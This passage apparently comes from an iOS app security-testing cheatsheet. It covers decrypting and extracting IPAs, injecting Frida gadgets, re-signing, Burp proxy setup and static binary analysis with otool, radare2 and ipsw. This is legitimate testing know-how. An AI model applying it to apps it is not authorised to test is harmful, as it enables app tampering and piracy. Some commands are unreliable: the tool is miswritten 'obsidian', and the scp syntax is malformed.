<li>Rename <code>.ipa</code> to <code>.zip</code></li>
<li>Unzip</li>
<li>Drag and drop the &ldquo;.app&rdquo; within &ldquo;Payload&rdquo; folder to the simulator&nbsp;</li>
</ol>
<p><strong>Method 2</strong>:</p>
<p>Use <code>xcrun</code>:</p>
<p>~~~shell
 xcrun simctl install booted <appname>.<app ipa="" or="">
 ~~~</app></appname></p>
<h4 id="extract-and-decrypt-ipa">Extract and Decrypt IPA</h4>
<p>It's possible to extract an IPA using <a href="https://github.com/AloneMonkey/frida-ios-dump">frida-ios-dump</a></p>
<ul>
<li>it's pretty outdated - might not work.</li>
<li>requires jailbroken device</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">### Requires local port forwarding</span>
iproxy<span class="w"> </span><span class="m">2222</span><span class="w"> </span><span class="m">22</span>

<span class="c1">### List installed apps</span>
python<span class="w"> </span>dump.py<span class="w"> </span>-l

<span class="c1">### Extract the IPA</span>
python<span class="w"> </span>dump.py<span class="w"> </span><span class="o">[</span>-u<span class="w"> </span>&lt;mobile<span class="w"> </span>username&gt;<span class="o">]</span><span class="w"> </span><span class="o">[</span>-P<span class="w"> </span>&lt;mobile<span class="w"> </span>password&gt;<span class="o">]</span><span class="w"> </span>&lt;Display<span class="w"> </span>Name&gt;<span class="p">|</span>&lt;Bundle<span class="w"> </span>Identifier&gt;<span class="w"> </span>
</code></pre></div>
<p>Take a look to:</p>
<ul>
<li>https://github.com/ChiChou/bagbak?tab=readme-ov-file</li>
<li>https://github.com/paradiseduo/appdecrypt</li>
</ul>
<p>When dealing with unencrypted IPAs, it's possible to extract them manually as follows:</p>
<p>1 - SSH to the device and go to:</p>
<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">containers</span><span class="o">/</span><span class="n">Bundle</span><span class="o">/</span><span class="n">Application</span><span class="o">/&lt;</span><span class="n">bundle</span><span class="w"> </span><span class="n">id</span><span class="o">&gt;</span>
</code></pre></div>
<p>1.1 - Get bundle ID manually:</p>
<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/var/containers/Bundle/Application<span class="w"> </span>-name<span class="w"> </span><span class="s2">"&lt;app name&gt;.app"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s2">"/"</span><span class="w"> </span>-f<span class="w"> </span><span class="m">6</span>
</code></pre></div>
<p>1.1 - Get application bundle full path with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>objection<span class="w"> </span>-g<span class="w"> </span>&lt;app<span class="w"> </span>identifier&gt;<span class="w"> </span>explore
&gt;<span class="w"> </span>ios<span class="w"> </span>bundles<span class="w"> </span>list_bundles<span class="w"> </span>--full-path
</code></pre></div>
<p>2 - Re-bundle the IPA as follows:</p>
<div class="highlight"><pre><span></span><code>mkdir<span class="w"> </span>Payload
cp<span class="w"> </span>-r<span class="w"> </span>&lt;app<span class="w"> </span>name&gt;.app<span class="w"> </span>Payload
zip<span class="w"> </span>-r<span class="w"> </span>&lt;app<span class="w"> </span>name&gt;.ipa<span class="w"> </span>Payload
</code></pre></div>
<p>3 - Copy the IPA to the machine:</p>
<div class="highlight"><pre><span></span><code>scp<span class="w"> </span>&lt;mobile<span class="w"> </span>user&gt;:&lt;mobile<span class="w"> </span>password&gt;:/var/containers/Bundle/Application/&lt;app<span class="w"> </span>name&gt;.ipa<span class="w"> </span>&lt;output<span class="w"> </span>directory&gt;
</code></pre></div>
<p>4 - Cleanup on the mobile device:</p>
<div class="highlight"><pre><span></span><code>rm<span class="w"> </span>-rf<span class="w"> </span>Payload<span class="w"> </span>&lt;app<span class="w"> </span>name&gt;.ipa
</code></pre></div>
<h4 id="patch-ipa-with-frida-gadget">Patch IPA with frida gadget</h4>
<p>This is useful when testing on a non jailbroken device or on a simulator.</p>
<p>Install <a href="https://github.com/tyilo/insert_dylib">insert_dylib</a>:</p>
<div class="highlight"><pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/Tyilo/insert_dylib<span class="w">  </span>
<span class="nb">cd</span><span class="w"> </span>insert_dylib<span class="w">  </span>
xcodebuild<span class="w">  </span>
cp<span class="w"> </span>build/Release/insert_dylib<span class="w"> </span>/usr/local/bin/insert_dylib
</code></pre></div>
<h4 id="patch-ipa-with-frida-gadget-objection">Patch IPA with frida gadget - Objection</h4>
<p>From <code>xcode</code>, locate the provisioning profiles:</p>
<ol>
<li>Open <code>xcode</code></li>
<li>Settings &gt; Accounts</li>
<li>Select the account and click on "Download Manual Profiles"</li>
<li>Profiles will be stored at <code>~/Library/Developer/Xcode/UserData/Provisioning\ Profiles</code></li>
</ol>
<p>Get signing identity:</p>
<div class="highlight"><pre><span></span><code>applesign<span class="w"> </span>-L
<span class="c1">### or</span>
security<span class="w"> </span>find-identity<span class="w"> </span>-p<span class="w"> </span>codesigning<span class="w"> </span>-v
</code></pre></div>
<p>Patch the IPA with <code>obsidian</code>:</p>
<div class="highlight"><pre><span></span><code>objection<span class="w"> </span>patchipa<span class="w"> </span>--source<span class="w"> </span>&lt;ipa<span class="w"> </span>path&gt;<span class="w"> </span>--codesign-signature<span class="w"> </span>&lt;signing<span class="w"> </span>identity&gt;<span class="w"> </span>-P<span class="w"> </span>&lt;provisioning<span class="w"> </span>profile<span class="w"> </span>path&gt;<span class="w"> </span><span class="o">[</span>-V<span class="w"> </span>&lt;frida<span class="w"> </span>version<span class="w"> </span><span class="p">|</span><span class="w"> </span>default<span class="w"> </span>to<span class="w"> </span>last&gt;<span class="o">]</span>
</code></pre></div>
<p><strong>ATTENTION</strong>: if the ipa is to be ran on a simulator, by default objection will NOT download the iOS simulator build for the gadget dylib. </p>
<ol>
<li>After running <code>objection patchipa</code>, download the correct dylib from https://github.com/frida/frida/releases/.</li>
<li>Replace the <code>FridaGadget.dylib</code> in the <code>~/.objection/ios</code> with the downloaded dylib (renamed exactly to <code>FridaGadget.dylib</code>)</li>
<li>Re-run <code>objection patchipa</code> - this time <code>objection</code> will use the correct dylib</li>
</ol>
<p><strong>ATTENTION</strong> (again): For some reason, if the app still crashes, try <strong>re-signing</strong> it as follows:</p>
<ol>
<li>Unzip the patched ipa: <code>unzip &lt;patched ipa&gt;</code></li>
<li>Run: <code>codesign --force --sign - --deep Payload/&lt;appname&gt;.app</code></li>
<li>Install the .app or re-bundle the Payload folder into a .ipa zip</li>
</ol>
<p>Launch the app and connect to it with <code>obsidian</code> or <code>frida</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1">### Objection</span>
objection<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-N<span class="w"> </span>explore

<span class="c1">### Frida</span>
frida<span class="w"> </span>-H<span class="w"> </span>localhost<span class="w"> </span>Gadget
</code></pre></div>
<h4 id="patch-ipa-with-frida-gadget-manual">Patch IPA with frida gadget - Manual</h4>
<p>Unzip the .ipa:</p>
<div class="highlight"><pre><span></span><code>unzip<span class="w"> </span>&lt;appname&gt;.ipa
</code></pre></div>
<p>Patch the Mach-O binary with <code>insert_dylib</code>:</p>
<div class="highlight"><pre><span></span><code>insert_dylib<span class="w"> </span>--all-yes<span class="w"> </span>@executable_path/frida-gadget.dylib<span class="w"> </span>Payload/&lt;appname&gt;.app/&lt;appname&gt;<span class="w"> </span>Payload/&lt;appname&gt;.app/&lt;appname&gt;.patched
</code></pre></div>
<p>Replace the Mach-O binary:</p>
<div class="highlight"><pre><span></span><code>mv<span class="w"> </span>Payload/&lt;appname&gt;.app/&lt;appname&gt;.patched<span class="w"> </span>Payload/&lt;appname&gt;.app/&lt;appname&gt;
</code></pre></div>
<p>Copy the frida gadget dylib into the .app root folder (due to <code>@executable_path/frida-gadget.dylib</code>):</p>
<div class="highlight"><pre><span></span><code>cp<span class="w"> </span>frida-gadget.dylib<span class="w"> </span>Payload/&lt;appname&gt;.app/
</code></pre></div>
<p>Re-sign the app:</p>
<div class="highlight"><pre><span></span><code>codesign<span class="w"> </span>--force<span class="w"> </span>--sign<span class="w"> </span>-<span class="w"> </span>--deep<span class="w"> </span>Payload/&lt;appname&gt;.app
</code></pre></div>
<p>Install the .app or re-bundle the Payload folder into a .ipa.</p>
<p>It's possible to re-sign an ipa using <code>applesign</code>:</p>
<div class="highlight"><pre><span></span><code>applesign<span class="w"> </span>-i<span class="w"> </span>&lt;signing<span class="w"> </span>identity&gt;<span class="w"> </span>-m<span class="w"> </span>&lt;provisioning<span class="w"> </span>file&gt;<span class="w"> </span>&lt;.ipa<span class="w"> </span>to<span class="w"> </span>re-sign&gt;
</code></pre></div>
<h4 id="jailbreaking">Jailbreaking</h4>
<p>Following resources provide an exhaustive list of available jailbreaks:</p>
<ul>
<li>https://theapplewiki.com/wiki/Jailbreak</li>
<li>https://ios.cfw.guide/get-started/ </li>
</ul>
<h4 id="proxy-configuration">Proxy Configuration</h4>
<h5 id="ssl-certificate-installation">SSL Certificate Installation</h5>
<ol>
<li>Set burp as proxy: Settings -&gt; Wifi -&gt; <code>&lt;Current WIFI connection&gt;</code> -&gt; Configure Proxy</li>
<li>Download the certicate from <code>http://burp</code></li>
<li>Settings -&gt; VPN &amp; Device Management -&gt; Click on downloaded profile (the certificate) -&gt; Install the profile</li>
<li>Settings -&gt; General -&gt; About -&gt; Trusted Certificates -&gt; "Enable full trust for root certificates" for PortSwigger CA</li>
</ol>
<h5 id="simulator-proxy">Simulator Proxy</h5>
<p>The simulator uses the system-wide proxy; it's possible to restrict proxy to particular hostnames as follows. This is useful when testing on simulator, avoiding to intercept all the system network traffic on Burp.</p>
<p>1 - Create a <code>.pac</code> script like the following:</p>
<div class="highlight"><pre><span></span><code><span class="nt">function</span><span class="w"> </span><span class="nt">FindProxyForURL</span><span class="o">(</span><span class="nt">url</span><span class="o">,</span><span class="w"> </span><span class="nt">host</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="err">PROXY</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">"PROXY</span><span class="w"> </span><span class="n">localhost</span><span class="p">:</span><span class="mi">8080</span><span class="s2">"</span>

<span class="s2">    // Match only interesting hostname, e.g. *.test.com</span>
<span class="s2">    if (shExpMatch(host,"</span><span class="o">*.</span><span class="n">test</span><span class="o">.</span><span class="n">com</span><span class="s2">")) {</span>
<span class="s2">        return PROXY;</span>
<span class="s2">    }</span>

<span class="s2">    // Everything else directly!</span>
<span class="s2">    return "</span><span class="n">DIRECT</span><span class="err">"</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>2 - Run a python web server in the same folder of the <code>.pac</code> script:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server
</code></pre></div>
<p>3 - Configure the proxy on the MacOS settings:</p>
<ol>
<li>Settings &gt; Network &gt; Wi-Fi (or the network being used) &gt; Current Connection's details &gt; Proxies Tab</li>
<li>Toggle "Automatic proxy configuration" and set the URL to <code>http://localhost:8000/&lt;pac script&gt;.pac</code></li>
</ol>
<h3 id="static-analysis_3">Static Analysis</h3>
<p><code>otool</code> reversing cheatsheet:</p>
<div class="highlight"><pre><span></span><code><span class="c1">### View architectures in a universal (fat) binary</span>
otool<span class="w"> </span>-f<span class="w"> </span>&lt;binary&gt;

<span class="c1">### Print Mach-O header</span>
otool<span class="w"> </span>-h<span class="w"> </span>&lt;binary&gt;

<span class="c1">### Print detailed Mach-O header</span>
otool<span class="w"> </span>-Hv<span class="w"> </span>&lt;binary&gt;

<span class="c1">### List shared libraries linked to the binary</span>
otool<span class="w"> </span>-L<span class="w"> </span>&lt;binary&gt;

<span class="c1">### List all Mach-O load commands</span>
otool<span class="w"> </span>-l<span class="w"> </span>&lt;binary&gt;

<span class="c1">### Dump contents of a specific section (e.g., __text in __TEXT)</span>
otool<span class="w"> </span>-s<span class="w"> </span>__TEXT<span class="w"> </span>__text<span class="w"> </span>&lt;binary&gt;

<span class="c1">### Print all sections of a given segment</span>
otool<span class="w"> </span>-v<span class="w"> </span>-s<span class="w"> </span>__DATA<span class="w"> </span>__objc_classlist<span class="w"> </span>&lt;binary&gt;

<span class="c1">### Show symbol table</span>
otool<span class="w"> </span>-Iv<span class="w"> </span>&lt;binary&gt;

<span class="c1">### List Objective-C class names</span>
otool<span class="w"> </span>-o<span class="w"> </span>&lt;binary&gt;

<span class="c1">### List Objective-C methods</span>
otool<span class="w"> </span>-ov<span class="w"> </span>&lt;binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>method

<span class="c1">### Disassemble instructions in the __TEXT,__text section</span>
otool<span class="w"> </span>-tV<span class="w"> </span>&lt;binary&gt;

<span class="c1">### Disassemble ARM64 binary explicitly</span>
otool<span class="w"> </span>-tV<span class="w"> </span>--arch<span class="w"> </span>arm64<span class="w"> </span>&lt;binary&gt;
</code></pre></div>
<p>Check if <strong>PIE (Position Independent Executable)</strong> enabled during build:</p>
<div class="highlight"><pre><span></span><code>otool<span class="w"> </span>-hv<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>PIE
</code></pre></div>
<p>Check if <strong>Stack Canaries</strong> enabled during build:</p>
<div class="highlight"><pre><span></span><code>otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>stack_chk
</code></pre></div>
<p>Check if <strong>ARC (Automatic Reference Counting)</strong> enabled during build:</p>
<div class="highlight"><pre><span></span><code>otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>objc_release
</code></pre></div>
<p>Check if the binary is <strong>Encrypted</strong>:</p>
<div class="highlight"><pre><span></span><code>otool<span class="w"> </span>-arch<span class="w"> </span>all<span class="w"> </span>-Vl<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A5<span class="w"> </span>LC_ENCRYPT
</code></pre></div>
<p>Vulnerable and insecure functions usage:</p>
<div class="highlight"><pre><span></span><code><span class="c1">### Insecure Algorithms</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_CC_MD5"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_CC_SHA1"</span>

<span class="c1">### Insecure functions/methods</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_random"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"__srand"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_rand"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_gets"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_memcpy"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_strncpy"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_strlen"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_vsnprintf"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_sscanf"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_strtok"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_alloca"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_sprintf"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_printf"</span>
otool<span class="w"> </span>-I<span class="w"> </span>-v<span class="w"> </span>&lt;app-binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"_vsprintf"</span>
</code></pre></div>
<p>Find method/function usage with <code>radare2</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1">### Open binary with auto-analysis</span>
r2<span class="w"> </span>-A<span class="w"> </span>MyAppBinary

<span class="c1">### Search for a method/function string inside the binary</span>
/<span class="w"> </span>methodName

<span class="c1">### List all symbols (functions, imports, exports)</span>
is

<span class="c1">### Filter symbols by keyword</span>
is~methodName

<span class="c1">### List all analyzed functions</span>
afl

<span class="c1">### Filter analyzed functions by keyword</span>
afl~methodName

<span class="c1">### Get cross-references (xrefs) to a function/symbol by address</span>
axt<span class="w"> </span>0xADDRESS

<span class="c1">### Get cross-references (xrefs) to a function/symbol by name</span>
axt<span class="w"> </span>sym.methodName

<span class="c1">### Disassemble function at given address</span>
pdf<span class="w"> </span>@<span class="w"> </span>0xADDRESS

<span class="c1">### Search for Objective-C selectors (methods ending with :)</span>
/C<span class="w"> </span>myMethod:

<span class="c1">### Find xrefs to objc_msgSend (indirect ObjC method calls)</span>
/C<span class="w"> </span>objc_msgSend
</code></pre></div>
<p>String searching and dumping with <code>radare2</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1">###&nbsp;Search for string</span>
/<span class="w"> </span>&lt;string<span class="w"> </span>to<span class="w"> </span>search&gt;

<span class="c1">### Search for byte sequence</span>
/x<span class="w"> </span>&lt;byte<span class="w"> </span>sequence<span class="w"> </span>to<span class="w"> </span>search&gt;<span class="w"> </span><span class="c1">###eg: /x 68656c6c6f20776f726c64</span>

<span class="c1">### List all strings in binary</span>
iz

<span class="c1">### Filter strings by keyword</span>
iz~keyword

<span class="c1">### Dump string at a given address</span>
ps<span class="w"> </span>@<span class="w"> </span>0xADDRESS

<span class="c1">### Dump null-terminated string at a given address</span>
psz<span class="w"> </span>@<span class="w"> </span>0xADDRESS

<span class="c1">### From shell, dump all strings without entering r2</span>
r2<span class="w"> </span>-q<span class="w"> </span>-c<span class="w"> </span>iz<span class="w"> </span>MyAppBinary
</code></pre></div>
<p>Search byte sequence with <code>otool</code>:</p>
<div class="highlight"><pre><span></span><code>otool<span class="w"> </span>-tVv<span class="w"> </span>MyAppBinary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A4<span class="w"> </span>-B4<span class="w"> </span><span class="s2">"&lt;byte sequence&gt;"</span>
</code></pre></div>
<p>Check Architecture with <code>lipo</code>:</p>
<div class="highlight"><pre><span></span><code>lipo<span class="w"> </span>-info<span class="w"> </span>Payload/MyApp.app/MyApp
</code></pre></div>
<p>Check target build platform with <code>otool</code>:</p>
<div class="highlight"><pre><span></span><code>otool<span class="w"> </span>-l<span class="w"> </span>&lt;appname&gt;.app/&lt;appname&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A3<span class="w"> </span>LC_BUILD_VERSION
</code></pre></div>
<ul>
<li><code>platform 2</code>&nbsp;= iOS (real device) </li>
<li><code>platform 7</code>&nbsp;= iOS Simulator</li>
<li>(Others:&nbsp;<code>1</code>&nbsp;macOS,&nbsp;<code>3</code>&nbsp;tvOS,&nbsp;<code>5</code>&nbsp;watchOS, etc.)</li>
</ul>
<p>Check linked libraries with <code>otool</code>:</p>
<div class="highlight"><pre><span></span><code>otool<span class="w"> </span>-L<span class="w"> </span>&lt;appname&gt;.app/&lt;appname&gt;
</code></pre></div>
<p>Check runtime paths with <code>otool</code>:</p>
<div class="highlight"><pre><span></span><code>otool<span class="w"> </span>-l<span class="w"> </span>&lt;appname&gt;.app/&lt;appname&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A2<span class="w"> </span>RPATH
</code></pre></div>
<p>Get code signature format using <code>codesign</code>:</p>
<div class="highlight"><pre><span></span><code>codesign<span class="w"> </span>-dv<span class="w"> </span>&lt;.app<span class="w"> </span>path&gt;
</code></pre></div>
<p>Check entitlements with <code>codesign</code>:</p>
<div class="highlight"><pre><span></span><code>codesign<span class="w"> </span>-dvvvv<span class="w"> </span>--entitlements<span class="w"> </span>:-<span class="w"> </span>Payload/MyApp.app/MyApp
</code></pre></div>
<p>Check entitlements with <code>ipsw</code>:</p>
<div class="highlight"><pre><span></span><code>ipsw<span class="w"> </span>ent<span class="w"> </span>--input<span class="w"> </span>&lt;binary&gt;<span class="w"> </span>--key<span class="w"> </span>&lt;entitlement&gt;
ipsw<span class="w"> </span>macho<span class="w"> </span>info<span class="w"> </span>-e<span class="w"> </span>&lt;binary&gt;
</code></pre></div>
<ul>
<li>If the entitlement <code>get-task-allow</code> is present, the application is built with debug symbols.</li>
</ul>
<p>Check if build with debug symbols using <code>objdump</code>:</p>
<div class="highlight"><pre><span></span><code>objdump<span class="w"> </span>--syms<span class="w"> </span>&lt;binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"d  "</span>
</code></pre></div>
<p>Get Plist content with <code>plutil</code>:</p>
<div class="highlight"><pre><span></span><code>plutil<span class="w"> </span>-p<span class="w"> </span>Info.plist
</code></pre></div>
<p>Get <code>MinimumOSVersion</code> with <code>plutil</code>:</p>
<div class="highlight"><pre><span></span><code>plutil<span class="w"> </span>-p<span class="w"> </span>Info.plist<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>MinimumOSVersion
</code></pre></div>
<p>Get binary information with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>objection<span class="w"> </span>-g<span class="w"> </span>&lt;app<span class="w"> </span>identifier&gt;<span class="w"> </span>run<span class="w"> </span><span class="s2">"ios info binary"</span>
</code></pre></div>
<p>Get binary info with <a href="https://github.com/blacktop/ipsw">ipsw</a>:</p>
<div class="highlight"><pre><span></span><code>ipsw<span class="w"> </span>macho<span class="w"> </span>info<span class="w"> </span>&lt;binary&gt;
</code></pre></div>
<p>Disassemble binary with <code>ipsw</code>:</p>
<div class="highlight"><pre><span></span><code>ipsw<span class="w"> </span>macho<span class="w"> </span>disass<span class="w"> </span>&lt;binary&gt;<span class="w"> </span>--symbol<span class="w"> </span>_main
</code></pre></div>
<p>Search string into binary with <code>ipsw</code>:</p>
<div class="highlight"><pre><span></span><code>ipsw<span class="w"> </span>macho<span class="w"> </span>search<span class="w"> </span>&lt;binary&gt;<span class="w"> </span>--string<span class="w"> </span><span class="s2">"&lt;string to search&gt;"</span>
</code></pre></div>
<p>Get dynamically loaded libraries with <code>ipsw</code>:</p>
<div class="highlight"><pre><span></span><code>ipsw<span class="w"> </span>macho<span class="w"> </span>info<span class="w"> </span>&lt;binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>LC_LOAD_DYLIB<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s2">" "</span><span class="w"> </span>-f<span class="w"> </span><span class="m">17</span><span class="w"> </span>
</code></pre></div>
<p>Dump Objective-C classes with <code>ipsw</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1">### Raw dump</span>
ipsw<span class="w"> </span>class-dump<span class="w"> </span>&lt;binary&gt;
<span class="c1">### Demangled dump</span>
ipsw<span class="w"> </span>class-dump<span class="w"> </span>--demangle<span class="w"> </span>&lt;binary&gt;
<span class="c1">### Dump ObjC headers</span>
ipsw<span class="w"> </span>class-dump<span class="w"> </span>--headers<span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>dir&gt;<span class="w"> </span>&lt;binary&gt;
</code></pre></div>
<p>Dump Swift classes with <code>ipsw</code>:</p>
<div class="highlight"><pre><span></span><code>ipsw<span class="w"> </span>swift-dump<span class="w"> </span>&lt;binary&gt;
ipsw<span class="w"> </span>swift-dump<span class="w"> </span>--demangle<span class="w"> </span>&lt;binary&gt;
<span class="c1">### Create separate header files for each Swift type/protocol/extension</span>
ipsw<span class="w"> </span>swift-dump<span class="w"> </span>--headers<span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>dir&gt;<span class="w"> </span>&lt;binary&gt;
</code></pre></div>
<p>Check if WebViews are being used:</p>
<div class="highlight"><pre><span></span><code>strings<span class="w"> </span>&lt;binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"UIWebView"</span>
strings<span class="w"> </span>&lt;binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"WKWebView"</span>
strings<span class="w"> </span>&lt;binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"SFSafariViewController"</span>
</code></pre></div>
<h4 id="objective-c-analysis">Objective-C Analysis</h4>
<p><strong>Step 1: Review Header Files</strong></p>
<p>A typical Objective-C header file looks like this:</p>
<div class="highlight"><pre><span></span><code><span class="cp">###ifndef MYZipWriter_h</span>
<span class="cp">###define MYZipWriter_h</span>
<span class="k">@import</span><span class="w"> </span><span class="n">Foundation</span><span class="p">;</span>

<span class="cp">###include "MYWriter-Protocol.h"</span>
<span class="cp">###include "MYZip.h"</span>

<span class="k">@class</span> <span class="bp">NSMutableData</span>, <span class="bp">NSObject</span>, <span class="bp">NSString</span>;

<span class="k">@interface</span> <span class="nc">MYZipWriter</span> : <span class="bp">NSObject</span><span class="w"> </span><span class="o">&lt;</span><span class="n">MYWriter</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="cm">/* instance variables */</span>
<span class="w">    </span><span class="kt">id</span><span class="w"> </span><span class="o">&lt;</span><span class="n">MYWriter</span><span class="o">&gt;</span><span class="w"> </span><span class="n">_writer</span><span class="p">;</span>
<span class="w">    </span><span class="n">MYZip</span><span class="w"> </span><span class="o">*</span><span class="n">_zipper</span><span class="p">;</span>
<span class="w">    </span><span class="bp">NSMutableData</span><span class="w"> </span><span class="o">*</span><span class="n">_zippedBuf</span><span class="p">;</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">bytes</span><span class="p">;</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="n">_zipped</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">@property</span><span class="w"> </span><span class="p">(</span><span class="k">readonly</span><span class="p">)</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">hash</span><span class="p">;</span>
<span class="k">@property</span><span class="w"> </span><span class="p">(</span><span class="k">readonly</span><span class="p">)</span><span class="w"> </span><span class="kt">Class</span><span class="w"> </span><span class="n">superclass</span><span class="p">;</span>
<span class="k">@property</span><span class="w"> </span><span class="p">(</span><span class="k">readonly</span><span class="p">,</span><span class="w"> </span><span class="k">copy</span><span class="p">)</span><span class="w"> </span><span class="bp">NSString</span><span class="w"> </span><span class="o">*</span><span class="n">description</span><span class="p">;</span>
<span class="k">@property</span><span class="w"> </span><span class="p">(</span><span class="k">readonly</span><span class="p">,</span><span class="w"> </span><span class="k">copy</span><span class="p">)</span><span class="w"> </span><span class="bp">NSString</span><span class="w"> </span><span class="o">*</span><span class="n">debugDescription</span><span class="p">;</span>

<span class="cm">/* instance methods */</span>
<span class="p">-</span> <span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nf">initWithWriter:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">writer</span><span class="w"> </span><span class="nf">compressing:</span><span class="p">(</span><span class="kt">_Bool</span><span class="p">)</span><span class="nv">compressing</span><span class="p">;</span>
